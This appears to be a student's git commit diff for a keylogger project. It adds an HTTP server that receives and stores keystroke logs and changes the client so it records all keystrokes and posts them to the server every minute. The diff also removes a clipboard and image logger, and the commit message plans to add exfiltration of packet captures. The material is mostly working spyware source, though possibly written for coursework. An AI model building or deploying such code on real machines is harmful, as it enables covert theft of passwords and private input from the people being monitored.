00b1760116baf750abd2323b6aa727eae0d7c58c
Cope, Louis(Student) <l.cope@lancaster.ac.uk>
2026-01-23 15:32:00 +0000

    Code modified to have exfiltration method of HTTP server. Currently functional: Keyboard logging. Removed the clipboard logger as it currently prevented the code from working. Next step is to send pcap files over to the http server to be stored alongside the keyboard captures

---
+++ dataHandler.py
@@ -0,0 +1,31 @@
+from http.server import BaseHTTPRequestHandler, HTTPServer
+
+class server(BaseHTTPRequestHandler):
+    def do_POST(self):
+        file_data = self.rfile.read(int(self.headers["content-length"]))
+        if int(self.headers["content-length"]) == 0:
+            self.send_error(404)
+        else:
+            if self.path == "/key":
+                print(file_data)
+                with open("keylog.txt", "a") as f:
+                    f.write(file_data.decode('utf-8') + "\n")
+                self.send_response(200)
+                self.end_headers()
+            
+            elif self.path == "/pcap":
+                self.send_response(200)
+                self.end_headers()
+
+def main():
+    with open("keylog.txt", "w") as f:
+        pass
+    with open("pcaplog.txt", "w") as f:
+        pass
+    print("Server intialising...")
+    httpd = HTTPServer(("localhost", 5000), server)
+    print("Server active")
+    httpd.serve_forever()
+
+if __name__ == "__main__":
+    main()
--- keylogger.py
+++ keylogger.py
@@ -1,59 +1,31 @@
 import keyboard
-import clipboard_monitor
+import requests as rq
+import socket
+from time import time
 import threading
-import sys
-from PIL import Image, ImageGrab
 
-class stoppableThread(threading.Thread):
-    def __init__(self, *args, **kwargs):
-        super(stoppableThread,self).__init__(*args, **kwargs)
-        self._stopEvent = threading.Event()
-    
-    def stop(self):
-        self._stopEvent.set()
+ip = socket.gethostbyname(socket.gethostname())
+server = "http://localhost:5000"
 
-def clip_txt(text):
-    print("Text copied!")
-    print(text)
-
-def clip_file(file):
-    print("File copied!")
-    print(file)
-
-def clip_img():
-    print("Image copied!")
-    img = ImageGrab.grabclipboard()
-    img.save(f"./KeyLogger/{count}.png")
-    count += 1
-
-def keylog():
-    record = keyboard.record(until="shift+esc")
-    with open("logfile.txt", "w") as f:
-        for item in record:
-            if item.event_type == "down":
-                f.write(item.name)
-    print("Recorded data")
-
-def clipboardlog():
-    clipboard_monitor.on_text(clip_txt)
-    clipboard_monitor.on_files(clip_file)
-    clipboard_monitor.on_image(clip_img)
-    clipboard_monitor.wait()
-    
+def sendKeyLog(record):
+    recordlist = ""
+    for item in record:
+        if item.event_type == "down":
+            recordlist += item.name
+    rs = rq.post(server + "/key", recordlist.encode('utf-8'))
 
 def main():
     count = 0
-    key_thread = threading.Thread(target=keylog)
-    clip_thread = stoppableThread(target=clipboardlog)
-    clip_thread.daemon = True 
-    key_thread.start()
-    clip_thread.start()
-
-    print("HI!")
-
-    key_thread.join()
-    print("JOIN 1")
-    sys.exit()
-    
+    ts = time()
+    keyboard.start_recording()
+    while True:
+        dt = time()
+        if dt - ts > 60:
+            record = keyboard.stop_recording()
+            sendKeyLog(record)
+            ts = time()
+            keyboard.start_recording()
+            
+        
 if __name__=="__main__":
     main()
